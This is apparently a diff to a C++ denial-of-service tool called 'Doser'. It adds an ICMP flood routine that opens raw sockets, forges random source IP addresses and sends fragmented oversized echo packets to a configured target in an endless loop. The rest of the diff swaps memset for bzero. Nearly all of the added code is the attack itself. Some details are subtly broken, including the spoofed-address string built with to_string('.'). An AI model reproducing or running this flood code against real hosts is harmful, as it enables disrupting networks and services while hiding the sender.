@@ -7,10 +7,16 @@
 #include <unistd.h>
 #include <iostream>
 #include <algorithm>
+#include <arpa/inet.h>
+#include <netinet/ip.h>
+#include <netinet/ip_icmp.h>
 #include "Doser.h"
 
 
 void Doser::attack(const int *id){
+    if(conf->vector == config::ICMPFlood){
+        icmp_flood(id);
+    }
     int x, r;
     std::vector<int> sockets;
     std::vector<bool> packets;
@@ -95,7 +101,7 @@ int Doser::make_socket(const char *host, const char *port) {
     int sock = 0, r;
     std::string message = std::string("Connecting-> ") + host + ":" + port;
     logger->Log(&message, Logger::Info);
-    memset(&hints, 0, sizeof(hints));
+    bzero(&hints, sizeof(hints));
     hints.ai_family = AF_UNSPEC;
     switch (conf->protocol){
         case config::TCP:
@@ -212,14 +218,14 @@ std::string Doser::randomizeUserAgent(){
 void Doser::read_socket(int socket){
     char chunk[128];
     while(read(socket , chunk, 128)){
-        memset(chunk , 0 , 128);
+        bzero(chunk, sizeof(chunk));
     }
 }
 
 void Doser::read_socket(SSL *ssl) {
     char chunk[128];
     while(SSL_read(ssl , chunk, 128)){
-        memset(chunk , 0 , 128);
+        bzero(chunk, sizeof(chunk));
     }
 }
 
@@ -339,6 +345,90 @@ void Doser::cleanup(SSL *ssl, const int *socket, SSL_CTX *ctx) {
     SSL_CTX_free(ctx);
 }
 
-void Doser::attack_icmp(const int *id) {
+void Doser::icmp_flood(const int *id) {
+    int s, x, offset, on = 1;
+    char buf[400];
+    std::string message{};
+    // Structs
+    auto *ip = (struct ip *)buf;
+    auto *icmp = (struct icmphdr *)(ip + 1);
+    struct hostent *hp;
+    struct sockaddr_in dst{};
+
+    while(true){
+        for(x = 0;x < conf->CONNECTIONS; x++){
+            bzero(buf, sizeof(buf));
+            if((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0){
+                logger->Log("socket() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) < 0){
+                logger->Log("setsockopt() error", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            if((hp = gethostbyname(conf->website.c_str())) == nullptr){
+                if((ip->ip_dst.s_addr = inet_addr(conf->website.c_str())) < 0){
+                    logger->Log("Can't resolve the host", Logger::Error);
+                    exit(EXIT_FAILURE);
+                }
+            }else{
+                bcopy(hp->h_addr_list[0], &ip->ip_dst.s_addr, static_cast<size_t>(hp->h_length));
+            }
+            std::string src{};
+            src += std::to_string(randomInt(1, 254))
+                   + std::to_string('.')
+                   + std::to_string(randomInt(1, 254))
+                   + std::to_string('.')
+                   + std::to_string(randomInt(1, 254))
+                   + std::to_string('.')
+                   + std::to_string(randomInt(1, 254));
+
+            if((ip->ip_src.s_addr = inet_addr(src.c_str())) < 0){
+                logger->Log("Unable to set random src ip", Logger::Error);
+                exit(EXIT_FAILURE);
+            }
+
+            // IP Struct
+            ip->ip_v = 4;
+            ip->ip_hl = sizeof*ip >> 2;
+            ip->ip_tos = 0;
+            ip->ip_len = htons(sizeof(buf));
+            ip->ip_id = htons(4321);
+            ip->ip_off = htons(0);
+            ip->ip_ttl = 255;
+            ip->ip_p = 1;
+            ip->ip_sum = 0;
+
+            dst.sin_addr = ip->ip_dst;
+            dst.sin_family = AF_INET;
+            icmp->type = ICMP_ECHO;
+            icmp->code = 0;
+            icmp->checksum = htons(~(ICMP_ECHO << 8));
+            for(offset = 0; offset < 65536; offset += (sizeof(buf) - sizeof(*ip))){
+                ip->ip_off = htons(offset >> 3);
+                if(offset < 65120){
+                    ip->ip_off |= htons(0x2000);
+                }else{
+                    ip->ip_len = htons(418);
+                }
+
+                if(sendto(s, buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) < 0){
+                    logger->Log("sendto() error", Logger::Error);
+                }
+
+                if(offset == 0){
+                    icmp->type = 0;
+                    icmp->code = 0;
+                    icmp->checksum = 0;
+                }
+            }
+            message = std::to_string(*id) + ": Voly Sent";
+            logger->Log(&message, Logger::Info);
+            close(s);
+            usleep(30000);
+        }
+    }
 
 }
